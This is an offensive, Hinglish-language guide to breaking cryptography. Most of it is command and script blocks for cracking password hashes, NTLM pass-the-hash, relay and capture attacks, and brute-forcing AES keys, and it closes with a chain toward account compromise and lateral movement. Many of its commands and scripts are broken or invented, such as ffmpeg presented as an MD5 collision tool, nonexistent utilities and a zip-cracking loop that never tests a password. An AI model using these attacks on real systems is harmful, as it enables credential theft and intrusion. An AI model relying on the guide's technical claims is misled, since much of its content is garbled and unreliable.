# Cryptography Breaking — Complete Guide

**Hash Cracking, Encryption Bypass, aur Cryptographic Attacks**

---

## 1. MD5 Hash Cracking

**Objective:** MD5 encrypted passwords ko crack karna.

```bash
# MD5 hash identify karo
echo -n "password" | md5sum
# Output: 5f4dcc3b5aa765d61d8327deb882cf99

# Online lookup (fast)
curl -s "https://md5.gromweb.com/?md5=5f4dcc3b5aa765d61d8327deb882cf99&api_key=test"

# Hashcat cracking
hashcat -m 0 hash.txt wordlist.txt

# John the Ripper
john --format=Raw-MD5 hash.txt

# Rainbow table
grep "5f4dcc3b5aa765d61d8327deb882cf99" /path/to/rainbow_table.txt

# Brute force (small passwords)
for i in {0000..9999}; do
  echo -n "$i" | md5sum | grep "5f4dcc3b5aa765d61d8327deb882cf99" && echo "Found: $i"
done
```

### MD5 Collision Attack

```bash
# Generate MD5 collision
ffmpeg -i input.jpg -vf "overlay=x=0:y=0" output.jpg
# Create two files with same MD5

# FastColl tool
git clone https://github.com/cr-marcstevens/fastcoll.git
cd fastcoll
make
./fastcoll -o out1.bin out2.bin  # Generates collision

# Verify collision
md5sum out1.bin out2.bin
```

**Detection Difficulty:** ⭐ (MD5 bahut weak hai)

---

## 2. SHA1/SHA256 Hash Cracking

**Objective:** Strong hashes ko crack karna.

```bash
# SHA1 cracking
hashcat -m 100 hash.txt wordlist.txt

# SHA256 cracking
hashcat -m 1400 hash.txt wordlist.txt

# John the Ripper
john --format=raw-sha1 hash.txt
john --format=raw-sha256 hash.txt

# Salted SHA256
# Format: hash$salt
hashcat -m 1710 hash.txt wordlist.txt

# GPU acceleration
hashcat -m 1400 hash.txt wordlist.txt -d 1 -O -w 4

# Dictionary attack with rules
hashcat -m 1400 hash.txt wordlist.txt -r rules/best64.rule

# Mask attack (brute force pattern)
hashcat -m 1400 hash.txt -a 3 -1 ?l?d "password?1?1?1?1"
```

### Rainbow Tables

```bash
# Rainbow table generation
rtgen md5 0x00 0xff 1 10000000 0 /path/to/table

# Rainbow table lookup
rtsearch /path/to/table hash_value

# Online rainbow tables
# https://www.rainbowtables.it/
# https://crackstation.net/
```

**Detection Difficulty:** ⭐⭐⭐ (Depends on password strength)

---

## 3. bcrypt/scrypt Password Cracking

**Objective:** Modern hashing algorithms ko crack karna.

```bash
# bcrypt identification
# Format: $2a$10$...
# $2b$10$...

# Hashcat cracking
hashcat -m 3200 hash.txt wordlist.txt

# John the Ripper
john --format=bcrypt hash.txt

# Scrypt cracking
hashcat -m 8900 hash.txt wordlist.txt

# Argon2 cracking
hashcat -m 34100 hash.txt wordlist.txt

# Slower cracking (bcrypt is intentionally slow)
john --format=bcrypt --wordlist=wordlist.txt hash.txt --fork=4

# GPU acceleration (if available)
hashcat -m 3200 hash.txt wordlist.txt -d 2 -w 4
```

**Detection Difficulty:** ⭐⭐⭐⭐ (Very difficult, design hai)

---

## 4. NTLM Hash Cracking

**Objective:** Windows NTLM hashes ko crack karna.

```bash
# NTLM hash format
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::

# Extract from Windows
wmis dcpromo /answer:unattend.txt
dumphash.exe

# Hashcat cracking
hashcat -m 1000 ntlm_hash.txt wordlist.txt

# John the Ripper
john --format=nt hash.txt

# Pass-the-hash attack (NTLM)
# Use hash directly without cracking
PsExec.exe -h \\\\TARGET -u Administrator -p aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 cmd.exe

# SMB relay attack
nmcrelayx.py -tf targets.txt -smb2support

# Rainbow table lookup
# NTLM has well-known rainbow tables
curl -s "https://www.cmd5.com/query/5f4dcc3b5aa765d61d8327deb882cf99"
```

### NTLMv2 Cracking

```bash
# NTLMv2 format (more secure)
# user::domain:challenge:response:attributes

# Capture NTLMv2
responder -I eth0 -v

# Crack with hashcat
hashcat -m 5600 ntlmv2_hash.txt wordlist.txt

# John the Ripper
john --format=netntlmv2 hash.txt
```

**Detection Difficulty:** ⭐⭐ (Dictionary attack possible)

---

## 5. Symmetric Encryption Breaking (AES, DES)

**Objective:** Encrypted data ko decrypt karna.

```bash
# Weak DES encryption
openssl enc -d -des-cbc -K 0123456789ABCDEF -iv 0123456789ABCDEF < encrypted.txt

# AES encryption
openssl enc -aes-256-cbc -d -in encrypted.txt -out decrypted.txt -K key -iv iv

# Brute force AES key
python3 << 'EOF'
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

encrypted_data = open('encrypted.bin', 'rb').read()
iv = encrypted_data[:16]
ciphertext = encrypted_data[16:]

# Try keys from wordlist
with open('keys.txt') as f:
    for key in f:
        key = key.strip().encode()
        try:
            cipher = AES.new(key.ljust(32), AES.MODE_CBC, iv)
            plaintext = cipher.decrypt(ciphertext)
            print(f"Key found: {key}")
            print(f"Plaintext: {plaintext}")
            break
        except:
            pass
EOF

# Using OpenSSL brute force
for key in $(cat keys.txt); do
  openssl enc -d -aes-256-cbc -in encrypted.txt -K $key -iv $iv 2>/dev/null && echo "Found: $key"
done
```

### ECB Mode Weakness

```bash
# ECB mode repeats same plaintext as same ciphertext
# Vulnerable to pattern analysis

# Detect ECB mode
python3 << 'EOF'
from Crypto.Cipher import AES
import binascii

encrypted = open('encrypted.bin', 'rb').read()
blocks = [encrypted[i:i+16] for i in range(0, len(encrypted), 16)]

# Check for duplicate blocks
if len(blocks) != len(set(blocks)):
    print("ECB mode detected! (Vulnerable)")
else:
    print("Not ECB mode")
EOF

# ECB penguin image attack
# ECB encrypt penguin image → reveals pattern
```

**Detection Difficulty:** ⭐⭐ (Depends on key strength)

---

## 6. RSA Encryption Breaking

**Objective:** RSA encrypted data ko decrypt karna.

```bash
# Small N factorization
python3 << 'EOF'
import sympy

n = 35794234179725902369368564060355142042578053768016391101651876815693800243027
p = sympy.factorint(n)
print(f"Factors: {p}")

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

# Generate RSA key
key = RSA.generate(2048)

# Encrypt
cipher = PKCS1_v1_5.new(key.publickey())
encrypted = cipher.encrypt(b'plaintext')

# Decrypt (if we have private key)
decipher = PKCS1_v1_5.new(key)
decrypted = decipher.decrypt(encrypted, None)
print(f"Decrypted: {decrypted}")
EOF

# RSA key recovery from public key
git clone https://github.com/FactorDB/factordb.git

# Online RSA factor database
curl -s "http://factordb.com/api?query=35794234179725902369368564060355142042578053768016391101651876815693800243027"

# Weak key generation
# If p or q close together - easy to factor
python3 << 'EOF'
import math

n = public_n
e = public_e

# Fermat's factorization (p and q close)
a = math.ceil(math.sqrt(n))
while True:
    b2 = a*a - n
    b = int(math.sqrt(b2))
    if b*b == b2:
        p = a - b
        q = a + b
        print(f"p={p}, q={q}")
        break
    a += 1
EOF
```

### Padding Oracle Attack

```bash
# PKCS#1 v1.5 padding oracle
Searchsploit "RSA padding oracle"

# If server reveals whether padding is correct:
# Can decrypt messages without key

python3 << 'EOF'
# Simplified padding oracle attack
def padding_oracle(ciphertext):
    try:
        decrypt(ciphertext)
        return True  # Valid padding
    except:
        return False  # Invalid padding

# Use binary search to find plaintext
EOF
```

**Detection Difficulty:** ⭐⭐⭐⭐ (RSA bahut strong hai)

---

## 7. Elliptic Curve Cryptography (ECC) Attacks

**Objective:** ECC encrypted data ko compromise karna.

```bash
# ECDSA key recovery from nonce reuse
python3 << 'EOF'
from ecdsa import SigningKey, VerifyingKey, NIST256p
import hashlib

# If same nonce used for two signatures
# Can recover private key

m1 = b"message1"
m2 = b"message2"

# Signatures with same nonce
s1 = sign(m1)
s2 = sign(m2)

# Private key recovery
# k = (z1 - z2) / (s1 - s2) mod n
EOF

# Elliptic curve discrete log
sage << 'EOF'
# Using Sage for discrete log
p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff
a = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc
b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b

E = EllipticCurve(GF(p), [a, b])
G = E((0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296,
        0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5))
P = E((0x5c4ce78b5e18491c468f15d0f8e2d887be1f7c14b6ec70f9d9e3a4ba0b7ebbd,
        0x47cd01fe8e77eff5a17e94c43bb5fc34c8c0fb1f3f70e0e1e4c82e1d0f2a8b0c))

# Discrete log
log = discrete_log(P, G, order=E.order())
print(f"Private key: {log}")
EOF
```

**Detection Difficulty:** ⭐⭐⭐⭐⭐ (ECC bahut secure hai)

---

## 8. Password-Based Encryption (PBE) Attacks

**Objective:** Password-protected files ko crack karna.

```bash
# PDF password cracking
pdftopython <<< "$(cat document.pdf)" | strings

# John the Ripper
john --format=pdf hash.txt wordlist.txt

# Hashcat
hashcat -m 10500 pdf_hash.txt wordlist.txt

# Office document cracking (Word/Excel)
Zip password: "VelociPastor"

# Python script
python3 << 'EOF'
import zipfile
from itertools import product
from string import ascii_letters, digits

zf = zipfile.ZipFile('document.xlsx')
for password in product(ascii_letters + digits, repeat=4):
    try:
        zf.testzip()
        print(f"Password found: {''.join(password)}")
        break
    except:
        pass
EOF

# 7z archive cracking
7z x -ppassword archive.7z

# RAR cracking
unrar l -ppassword archive.rar
```

---

## 9. Side-Channel Attacks

**Objective:** Timing, power, electromagnetic signals se key extract karna.

```bash
# Timing attack on password comparison
python3 << 'EOF'
import time

# Vulnerable code:
# if password == input_password:
#     return True

# Time difference reveals correct characters
password = "admin123"
guesses = ["aaaaaa", "aaaaaaa", "admin12", "admin123"]

for guess in guesses:
    start = time.time()
    if password == guess:
        pass
    elapsed = time.time() - start
    print(f"{guess}: {elapsed}s")  # Correct password takes longer
EOF

# Power analysis
# Correlate power consumption with operations

# Electromagnetic analysis
# Measure EM radiation from processor

# Acoustic cryptanalysis
# Analyze sound from CPU during encryption
```

---

## 10. Advanced Cryptography Attack Combo

**Objective:** Multiple techniques combine karke complete key recovery.

### Full Attack Chain

```bash
# Step 1: Hash identification
file hash_sample.txt
# Output: ASCII text

# Step 2: Format detection
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat --identify
# Output: MD5

# Step 3: Wordlist preparation
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt

# Step 4: Rainbow table lookup (fast)
curl -s "https://www.cmd5.com/query/5f4dcc3b5aa765d61d8327deb882cf99"

# Step 5: Hashcat cracking
hashcat -m 0 hash.txt wordlist.txt --show

# Step 6: Validation
echo -n "password" | md5sum
# Verify match

# Step 7: Use recovered password
# - SSH login
# - Database access
# - Account compromise
# - Lateral movement
```

---

## Cryptography Tools

```bash
# Hash cracking
hashcat
john
rainbow tables

# Encryption/Decryption
openssl
gpg

# Cryptanalysis
sage
magma
python-crypto

# Key recovery
factordb

# Side-channel
chisel
power_trace_analysis
```

---

## Kanuni Chetavni

```
⚖️ Savdhani! ⚖️

Cryptography breaking sirf authorized targets par!

✓ Bug bounty programs
✓ Penetration testing (with permission)
✓ Research and education

✗ Unauthorized decryption illegal
✗ Data theft
✗ Privacy violation

Criminal penalties!
```

---

## Quick Reference - Cracking Commands

```bash
# Identify hash
hashcat --identify hash.txt

# MD5 crack
hashcat -m 0 hash.txt wordlist.txt

# SHA256 crack
hashcat -m 1400 hash.txt wordlist.txt

# bcrypt crack
hashcat -m 3200 hash.txt wordlist.txt

# NTLM crack
hashcat -m 1000 hash.txt wordlist.txt

# John the Ripper
john --format=raw-sha256 hash.txt

# Rainbow table
curl -s "https://www.cmd5.com/query/HASH"

# Full attack
hashcat --identify hash.txt && hashcat -m MODE hash.txt wordlist.txt -r rules/best64.rule -O -w 4
```

---

**Banaya Gaya:** Cryptography Breaking Database  
**Classification:** Cryptanalysis  
**Skill Level:** Expert  
**Risk Level:** Critical

---

**Last Updated:** 2026-06-16  
**Creator:** Red Team Ops
